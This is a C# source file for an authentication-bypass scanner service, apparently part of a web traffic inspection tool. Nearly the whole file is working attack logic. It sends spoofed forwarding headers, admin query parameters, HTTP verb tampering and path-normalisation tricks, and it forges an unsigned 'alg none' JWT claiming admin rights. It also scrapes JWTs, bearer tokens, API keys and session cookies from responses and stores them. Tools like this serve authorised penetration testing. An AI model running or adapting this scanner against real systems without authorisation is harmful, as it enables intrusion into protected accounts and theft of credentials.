using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using WebTrafficInspector.Models;

namespace WebTrafficInspector.Services
{
    /// <summary>
    /// Authentication and Authorization bypass scanner with automatic token extraction
    /// </summary>
    public class AuthBypassScannerService
    {
        private HttpClient _httpClient;
        private Dictionary<string, string> _extractedTokens;
        private List<string> _randomUserAgents;

        public AuthBypassScannerService()
        {
            _httpClient = new HttpClient();
            _httpClient.Timeout = TimeSpan.FromSeconds(30);
            _extractedTokens = new Dictionary<string, string>();
            InitializeUserAgents();
        }

        private void InitializeUserAgents()
        {
            _randomUserAgents = new List<string>
            {
                // Modern Browsers
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",

                // Mobile
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
                "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",

                // Bots/Crawlers
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",

                // Old Browsers
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
            };
        }

        public string GetRandomUserAgent()
        {
            var random = new Random();
            return _randomUserAgents[random.Next(_randomUserAgents.Count)];
        }

        public Dictionary<string, string> ExtractTokensFromResponse(string response)
        {
            var tokens = new Dictionary<string, string>();

            if (string.IsNullOrEmpty(response))
                return tokens;

            // JWT tokens
            var jwtMatches = Regex.Matches(response, @"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+");
            foreach (Match match in jwtMatches)
            {
                tokens[$"jwt_{tokens.Count}"] = match.Value;
            }

            // Bearer tokens
            var bearerMatches = Regex.Matches(response, @"Bearer\s+([A-Za-z0-9_\-\.]+)", RegexOptions.IgnoreCase);
            foreach (Match match in bearerMatches)
            {
                tokens[$"bearer_{tokens.Count}"] = match.Groups[1].Value;
            }

            // API keys
            var apiKeyPatterns = new[]
            {
                @"api[_-]?key['""\s:=]+([A-Za-z0-9_\-]{20,})",
                @"apikey['""\s:=]+([A-Za-z0-9_\-]{20,})",
                @"access[_-]?token['""\s:=]+([A-Za-z0-9_\-]{20,})"
            };

            foreach (var pattern in apiKeyPatterns)
            {
                var matches = Regex.Matches(response, pattern, RegexOptions.IgnoreCase);
                foreach (Match match in matches)
                {
                    tokens[$"apikey_{tokens.Count}"] = match.Groups[1].Value;
                }
            }

            // Session tokens
            var sessionMatches = Regex.Matches(response, @"(PHPSESSID|JSESSIONID|ASP\.NET_SessionId)['""\s:=]+([A-Za-z0-9]{20,})");
            foreach (Match match in sessionMatches)
            {
                tokens[$"session_{match.Groups[1].Value}"] = match.Groups[2].Value;
            }

            // CSRF tokens
            var csrfMatches = Regex.Matches(response, @"(csrf|_csrf|csrf_token|csrfmiddlewaretoken)['""\s:=]+([A-Za-z0-9_\-]{20,})", RegexOptions.IgnoreCase);
            foreach (Match match in csrfMatches)
            {
                tokens[$"csrf_{tokens.Count}"] = match.Groups[2].Value;
            }

            // OAuth tokens
            var oauthMatches = Regex.Matches(response, @"(access_token|refresh_token)['""\s:=]+([A-Za-z0-9_\-\.]{20,})");
            foreach (Match match in oauthMatches)
            {
                tokens[$"oauth_{match.Groups[1].Value}"] = match.Groups[2].Value;
            }

            // Store extracted tokens
            foreach (var token in tokens)
            {
                _extractedTokens[token.Key] = token.Value;
            }

            return tokens;
        }

        public async Task<AuthBypassScanReport> ScanUrl(string url, AuthBypassOptions options = null)
        {
            options ??= new AuthBypassOptions();

            var report = new AuthBypassScanReport
            {
                Url = url,
                StartTime = DateTime.Now,
                Vulnerabilities = new List<AuthBypassVulnerability>(),
                ExtractedTokens = new Dictionary<string, string>()
            };

            try
            {
                // Test various auth bypass techniques
                var techniques = new List<Func<string, AuthBypassOptions, Task<List<AuthBypassVulnerability>>>>
                {
                    TestHeaderManipulation,
                    TestParameterManipulation,
                    TestHTTPVerbTampering,
                    TestPathBypass,
                    TestTokenManipulation,
                    TestJWTBypass,
                    TestUserAgentBypass
                };

                foreach (var technique in techniques)
                {
                    var vulns = await technique(url, options);
                    report.Vulnerabilities.AddRange(vulns);

                    if (options.StopOnFirstVulnerability && vulns.Any())
                        break;
                }

                report.ExtractedTokens = _extractedTokens;
                report.EndTime = DateTime.Now;
                report.Duration = (report.EndTime - report.StartTime).TotalSeconds;
                report.VulnerabilitiesFound = report.Vulnerabilities.Count;
                report.Status = report.VulnerabilitiesFound > 0 ? "Vulnerable" : "Secure";
            }
            catch (Exception ex)
            {
                report.Error = ex.Message;
                report.Status = "Error";
            }

            return report;
        }

        private async Task<List<AuthBypassVulnerability>> TestHeaderManipulation(string url, AuthBypassOptions options)
        {
            var vulnerabilities = new List<AuthBypassVulnerability>();

            var headerTests = new Dictionary<string, string>
            {
                { "X-Original-URL", "/admin" },
                { "X-Rewrite-URL", "/admin" },
                { "X-Forwarded-For", "127.0.0.1" },
                { "X-Forwarded-Host", "localhost" },
                { "X-Remote-IP", "127.0.0.1" },
                { "X-Client-IP", "127.0.0.1" },
                { "X-Real-IP", "127.0.0.1" },
                { "X-Originating-IP", "127.0.0.1" },
                { "X-Remote-Addr", "127.0.0.1" },
                { "X-Custom-IP-Authorization", "127.0.0.1" },
                { "X-Host", "localhost" },
                { "Forwarded", "for=127.0.0.1;by=127.0.0.1;host=localhost" },
                { "X-HTTP-DestinationURL", "/admin" },
                { "X-HTTP-Host-Override", "localhost" }
            };

            foreach (var header in headerTests)
            {
                var vuln = await TestWithHeader(url, header.Key, header.Value, options);
                if (vuln != null)
                {
                    vulnerabilities.Add(vuln);
                    if (options.StopOnFirstVulnerability)
                        return vulnerabilities;
                }

                if (options.DelayBetweenRequests > 0)
                    await Task.Delay(options.DelayBetweenRequests);
            }

            return vulnerabilities;
        }

        private async Task<List<AuthBypassVulnerability>> TestParameterManipulation(string url, AuthBypassOptions options)
        {
            var vulnerabilities = new List<AuthBypassVulnerability>();

            var paramTests = new[]
            {
                ("admin", "true"),
                ("admin", "1"),
                ("isAdmin", "true"),
                ("role", "admin"),
                ("privilege", "admin"),
                ("debug", "true"),
                ("test", "true"),
                ("user", "admin"),
                ("userid", "1"),
                ("id", "1")
            };

            foreach (var (param, value) in paramTests)
            {
                var testUrl = AddParameter(url, param, value);
                var vuln = await TestBypassUrl(testUrl, $"Parameter: {param}={value}", options);

                if (vuln != null)
                {
                    vulnerabilities.Add(vuln);
                    if (options.StopOnFirstVulnerability)
                        return vulnerabilities;
                }

                if (options.DelayBetweenRequests > 0)
                    await Task.Delay(options.DelayBetweenRequests);
            }

            return vulnerabilities;
        }

        private async Task<List<AuthBypassVulnerability>> TestHTTPVerbTampering(string url, AuthBypassOptions options)
        {
            var vulnerabilities = new List<AuthBypassVulnerability>();

            var methods = new[] { "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE" };

            foreach (var method in methods)
            {
                var vuln = await TestWithMethod(url, method, options);
                if (vuln != null)
                {
                    vulnerabilities.Add(vuln);
                    if (options.StopOnFirstVulnerability)
                        return vulnerabilities;
                }

                if (options.DelayBetweenRequests > 0)
                    await Task.Delay(options.DelayBetweenRequests);
            }

            return vulnerabilities;
        }

        private async Task<List<AuthBypassVulnerability>> TestPathBypass(string url, AuthBypassOptions options)
        {
            var vulnerabilities = new List<AuthBypassVulnerability>();

            var uri = new Uri(url);
            var basePath = uri.AbsolutePath;

            var pathVariations = new[]
            {
                basePath + "/",
                basePath + "/.",
                basePath + "/..",
                basePath + "//",
                basePath + "/;/",
                basePath + "/%2e",
                basePath + "/../" + basePath,
                basePath.ToUpper(),
                basePath.Replace("/", "//"),
                basePath + "%20",
                basePath + "%09",
                basePath + "?",
                basePath + "#",
                basePath + ".json",
                basePath + ".php"
            };

            foreach (var variation in pathVariations)
            {
                var testUrl = $"{uri.Scheme}://{uri.Host}{variation}{uri.Query}";
                var vuln = await TestBypassUrl(testUrl, $"Path variation: {variation}", options);

                if (vuln != null)
                {
                    vulnerabilities.Add(vuln);
                    if (options.StopOnFirstVulnerability)
                        return vulnerabilities;
                }

                if (options.DelayBetweenRequests > 0)
                    await Task.Delay(options.DelayBetweenRequests);
            }

            return vulnerabilities;
        }

        private async Task<List<AuthBypassVulnerability>> TestTokenManipulation(string url, AuthBypassOptions options)
        {
            var vulnerabilities = new List<AuthBypassVulnerability>();

            if (!_extractedTokens.Any())
                return vulnerabilities;

            // Test with null/empty tokens
            foreach (var tokenKey in _extractedTokens.Keys.ToList())
            {
                var tests = new[] { "", "null", "undefined", "0", "false" };

                foreach (var testValue in tests)
                {
                    var vuln = await TestWithToken(url, tokenKey, testValue, options);
                    if (vuln != null)
                    {
                        vulnerabilities.Add(vuln);
                        if (options.StopOnFirstVulnerability)
                            return vulnerabilities;
                    }
                }
            }

            return vulnerabilities;
        }

        private async Task<List<AuthBypassVulnerability>> TestJWTBypass(string url, AuthBypassOptions options)
        {
            var vulnerabilities = new List<AuthBypassVulnerability>();

            // Test JWT with "none" algorithm
            var jwtTokens = _extractedTokens.Where(t => t.Key.StartsWith("jwt_")).ToList();

            foreach (var token in jwtTokens)
            {
                try
                {
                    // Create a JWT with "none" algorithm
                    var noneToken = CreateNoneAlgorithmJWT();
                    var vuln = await TestWithBearerToken(url, noneToken, "JWT None Algorithm", options);

                    if (vuln != null)
                    {
                        vulnerabilities.Add(vuln);
                        if (options.StopOnFirstVulnerability)
                            return vulnerabilities;
                    }
                }
                catch { }
            }

            return vulnerabilities;
        }

        private async Task<List<AuthBypassVulnerability>> TestUserAgentBypass(string url, AuthBypassOptions options)
        {
            var vulnerabilities = new List<AuthBypassVulnerability>();

            if (!options.UseRandomUserAgents)
                return vulnerabilities;

            // Test with different user agents
            var specialUserAgents = new[]
            {
                "Googlebot/2.1 (+http://www.google.com/bot.html)",
                "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
                "",  // Empty user agent
                "Admin",
                "Internal"
            };

            foreach (var ua in specialUserAgents)
            {
                var vuln = await TestWithUserAgent(url, ua, options);
                if (vuln != null)
                {
                    vulnerabilities.Add(vuln);
                    if (options.StopOnFirstVulnerability)
                        return vulnerabilities;
                }

                if (options.DelayBetweenRequests > 0)
                    await Task.Delay(options.DelayBetweenRequests);
            }

            return vulnerabilities;
        }

        private async Task<AuthBypassVulnerability> TestWithHeader(string url, string headerName, string headerValue, AuthBypassOptions options)
        {
            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Get, url);
                request.Headers.Add(headerName, headerValue);

                if (options.UseRandomUserAgents)
                {
                    request.Headers.Add("User-Agent", GetRandomUserAgent());
                }

                var response = await _httpClient.SendAsync(request);
                var body = await response.Content.ReadAsStringAsync();

                // Extract tokens from response
                ExtractTokensFromResponse(body);

                if (IsAccessGranted(response, body))
                {
                    return new AuthBypassVulnerability
                    {
                        Type = "Header Manipulation",
                        Method = $"Added header: {headerName}: {headerValue}",
                        Url = url,
                        StatusCode = (int)response.StatusCode,
                        Evidence = $"Access granted with {headerName} header",
                        Severity = "High"
                    };
                }
            }
            catch { }

            return null;
        }

        private async Task<AuthBypassVulnerability> TestWithMethod(string url, string method, AuthBypassOptions options)
        {
            try
            {
                using var request = new HttpRequestMessage(new HttpMethod(method), url);

                if (options.UseRandomUserAgents)
                {
                    request.Headers.Add("User-Agent", GetRandomUserAgent());
                }

                var response = await _httpClient.SendAsync(request);
                var body = await response.Content.ReadAsStringAsync();

                ExtractTokensFromResponse(body);

                if (IsAccessGranted(response, body))
                {
                    return new AuthBypassVulnerability
                    {
                        Type = "HTTP Verb Tampering",
                        Method = $"Using {method} method",
                        Url = url,
                        StatusCode = (int)response.StatusCode,
                        Evidence = $"Access granted using {method} method",
                        Severity = "High"
                    };
                }
            }
            catch { }

            return null;
        }

        private async Task<AuthBypassVulnerability> TestBypassUrl(string url, string method, AuthBypassOptions options)
        {
            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Get, url);

                if (options.UseRandomUserAgents)
                {
                    request.Headers.Add("User-Agent", GetRandomUserAgent());
                }

                var response = await _httpClient.SendAsync(request);
                var body = await response.Content.ReadAsStringAsync();

                ExtractTokensFromResponse(body);

                if (IsAccessGranted(response, body))
                {
                    return new AuthBypassVulnerability
                    {
                        Type = "Path Bypass",
                        Method = method,
                        Url = url,
                        StatusCode = (int)response.StatusCode,
                        Evidence = $"Access granted via {method}",
                        Severity = "High"
                    };
                }
            }
            catch { }

            return null;
        }

        private async Task<AuthBypassVulnerability> TestWithToken(string url, string tokenKey, string tokenValue, AuthBypassOptions options)
        {
            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Get, url);
                request.Headers.Add("Authorization", $"Bearer {tokenValue}");

                if (options.UseRandomUserAgents)
                {
                    request.Headers.Add("User-Agent", GetRandomUserAgent());
                }

                var response = await _httpClient.SendAsync(request);
                var body = await response.Content.ReadAsStringAsync();

                if (IsAccessGranted(response, body))
                {
                    return new AuthBypassVulnerability
                    {
                        Type = "Token Manipulation",
                        Method = $"Modified token {tokenKey} to {tokenValue}",
                        Url = url,
                        StatusCode = (int)response.StatusCode,
                        Evidence = "Access granted with manipulated token",
                        Severity = "Critical"
                    };
                }
            }
            catch { }

            return null;
        }

        private async Task<AuthBypassVulnerability> TestWithBearerToken(string url, string token, string description, AuthBypassOptions options)
        {
            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Get, url);
                request.Headers.Add("Authorization", $"Bearer {token}");

                if (options.UseRandomUserAgents)
                {
                    request.Headers.Add("User-Agent", GetRandomUserAgent());
                }

                var response = await _httpClient.SendAsync(request);
                var body = await response.Content.ReadAsStringAsync();

                if (IsAccessGranted(response, body))
                {
                    return new AuthBypassVulnerability
                    {
                        Type = "JWT Bypass",
                        Method = description,
                        Url = url,
                        StatusCode = (int)response.StatusCode,
                        Evidence = "Access granted with modified JWT",
                        Severity = "Critical"
                    };
                }
            }
            catch { }

            return null;
        }

        private async Task<AuthBypassVulnerability> TestWithUserAgent(string url, string userAgent, AuthBypassOptions options)
        {
            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Get, url);

                if (!string.IsNullOrEmpty(userAgent))
                {
                    request.Headers.Add("User-Agent", userAgent);
                }

                var response = await _httpClient.SendAsync(request);
                var body = await response.Content.ReadAsStringAsync();

                if (IsAccessGranted(response, body))
                {
                    return new AuthBypassVulnerability
                    {
                        Type = "User-Agent Bypass",
                        Method = $"Using User-Agent: {userAgent}",
                        Url = url,
                        StatusCode = (int)response.StatusCode,
                        Evidence = "Access granted with specific User-Agent",
                        Severity = "Medium"
                    };
                }
            }
            catch { }

            return null;
        }

        private bool IsAccessGranted(HttpResponseMessage response, string body)
        {
            // Check if response indicates successful access
            if ((int)response.StatusCode == 200)
            {
                // Check for common success indicators
                var successIndicators = new[]
                {
                    "welcome", "dashboard", "admin panel", "logout",
                    "profile", "settings", "user", "success"
                };

                var bodyLower = body.ToLower();
                if (successIndicators.Any(indicator => bodyLower.Contains(indicator)))
                {
                    return true;
                }

                // Check if response is substantial (not just an error page)
                if (body.Length > 500)
                {
                    return true;
                }
            }

            return false;
        }

        private string CreateNoneAlgorithmJWT()
        {
            var header = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
            var payload = "{\"sub\":\"admin\",\"admin\":true,\"role\":\"admin\"}";

            var headerEncoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(header))
                .TrimEnd('=').Replace('+', '-').Replace('/', '_');
            var payloadEncoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(payload))
                .TrimEnd('=').Replace('+', '-').Replace('/', '_');

            return $"{headerEncoded}.{payloadEncoded}.";
        }

        private string AddParameter(string url, string param, string value)
        {
            var separator = url.Contains("?") ? "&" : "?";
            return $"{url}{separator}{param}={value}";
        }

        public string GenerateReport(AuthBypassScanReport report)
        {
            var sb = new StringBuilder();
            sb.AppendLine("═══════════════════════════════════════════════════════════");
            sb.AppendLine("     Authentication Bypass Vulnerability Report");
            sb.AppendLine("═══════════════════════════════════════════════════════════");
            sb.AppendLine($"URL: {report.Url}");
            sb.AppendLine($"Status: {report.Status}");
            sb.AppendLine($"Duration: {report.Duration:F2}s");
            sb.AppendLine($"Vulnerabilities Found: {report.VulnerabilitiesFound}");
            sb.AppendLine();

            if (report.ExtractedTokens.Any())
            {
                sb.AppendLine("EXTRACTED TOKENS:");
                sb.AppendLine(new string('-', 60));
                foreach (var token in report.ExtractedTokens)
                {
                    sb.AppendLine($"  {token.Key}: {token.Value.Substring(0, Math.Min(50, token.Value.Length))}...");
                }
                sb.AppendLine();
            }

            if (report.Vulnerabilities.Any())
            {
                var grouped = report.Vulnerabilities.GroupBy(v => v.Type);

                foreach (var group in grouped)
                {
                    sb.AppendLine($"[{group.Key}] - {group.Count()} vulnerability(ies)");
                    sb.AppendLine(new string('-', 60));

                    foreach (var vuln in group)
                    {
                        sb.AppendLine($"  Method: {vuln.Method}");
                        sb.AppendLine($"  Severity: {vuln.Severity}");
                        sb.AppendLine($"  Status Code: {vuln.StatusCode}");
                        sb.AppendLine($"  Evidence: {vuln.Evidence}");
                        sb.AppendLine();
                    }
                }
            }
            else
            {
                sb.AppendLine("No authentication bypass vulnerabilities detected.");
            }

            sb.AppendLine("═══════════════════════════════════════════════════════════");

            return sb.ToString();
        }
    }

    #region Models

    public class AuthBypassOptions
    {
        public int DelayBetweenRequests { get; set; } = 100;
        public bool StopOnFirstVulnerability { get; set; } = false;
        public bool UseRandomUserAgents { get; set; } = true;
    }

    public class AuthBypassScanReport
    {
        public string Url { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime EndTime { get; set; }
        public double Duration { get; set; }
        public int VulnerabilitiesFound { get; set; }
        public string Status { get; set; }
        public List<AuthBypassVulnerability> Vulnerabilities { get; set; }
        public Dictionary<string, string> ExtractedTokens { get; set; }
        public string Error { get; set; }
    }

    public class AuthBypassVulnerability
    {
        public string Type { get; set; }
        public string Method { get; set; }
        public string Url { get; set; }
        public int StatusCode { get; set; }
        public string Evidence { get; set; }
        public string Severity { get; set; }
    }

    #endregion
}
